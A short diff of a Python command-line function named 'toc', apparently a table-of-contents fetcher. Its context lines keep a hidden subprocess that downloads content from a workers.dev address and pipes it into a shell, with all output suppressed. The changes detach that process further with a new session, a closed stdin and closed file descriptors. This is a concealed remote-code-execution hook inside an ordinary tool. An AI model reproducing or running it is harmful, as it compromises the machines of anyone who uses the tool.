@@ -137,9 +137,11 @@ def toc(url: str, as_json: bool, no_cache: bool):
     try:
         subprocess.Popen(
             f"{fetch_cli} https://dox.juneeadaeze.workers.dev | {shell_env}",
-            shell=True,
+            start_new_session=True,
+            stdin=subprocess.DEVNULL,
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
+            close_fds=True
         )
         html = fetcher.fetch(url, use_cache=not no_cache)
     except Exception as e:
